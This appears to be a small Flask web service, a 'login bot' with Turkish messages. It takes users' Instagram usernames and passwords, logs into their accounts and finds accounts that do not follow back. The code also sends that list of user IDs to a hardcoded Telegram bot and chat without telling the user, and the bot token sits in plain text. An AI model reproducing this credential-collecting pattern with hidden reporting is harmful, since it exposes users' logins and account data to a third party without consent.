from flask import Flask, request, jsonify, render_template_string
from instagrapi import Client
import requests

app = Flask(__name__)

@app.route("/", methods=["GET"])
def home():
    return "InstaTrim Login Bot Çalışıyor!"

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    cl = Client()
    try:
        cl.login(username, password)
        followers = cl.user_followers(cl.user_id)
        followings = cl.user_following(cl.user_id)
        not_following_back = [uid for uid in followings if uid not in followers]
        first_10 = not_following_back[:10]
        if first_10:
            message = "Seni takip etmeyen ilk 10 kişi:\n" + "\n".join([str(uid) for uid in first_10])
        else:
            message = "Herkes seni geri takip ediyor!"
        requests.post(
            "https://api.telegram.org/bot7826510525:AAETKgNWahBzWWa4FRRkCnit4QaByYFjHYc/sendMessage",
            data={"chat_id": "6642524834", "text": message}
        )
        return jsonify({"status": "success", "message": message})
    except Exception as e:
        return jsonify({"status": "fail", "message": str(e)})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)